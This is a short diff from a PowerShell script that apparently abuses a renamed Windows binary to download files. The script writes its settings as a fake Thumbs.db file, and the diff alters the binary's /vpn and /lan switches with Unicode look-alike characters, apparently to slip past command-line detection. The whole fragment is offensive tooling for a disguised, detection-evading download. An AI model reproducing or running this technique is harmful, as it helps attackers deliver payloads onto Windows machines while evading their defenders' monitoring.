@@ -45,7 +45,7 @@ Set-Content -Path "$tempDir\Thumbs.db" -Value $settingsContent
 
 # Use the renamed updater.exe for downloading
 Write-Host "[*] Performing download with $newCmdl32Name"
-$arguments = "/₞vpn /₞lan `"$tempDir\Thumbs.db`""
+$arguments = "/vpn /ᴸan `"$tempDir\Thumbs.db`""
 try {
     Start-Process -FilePath $newCmdl32Path -ArgumentList $arguments -NoNewWindow -Wait
     Write-Host "[*] Download complete with $newCmdl32Name."
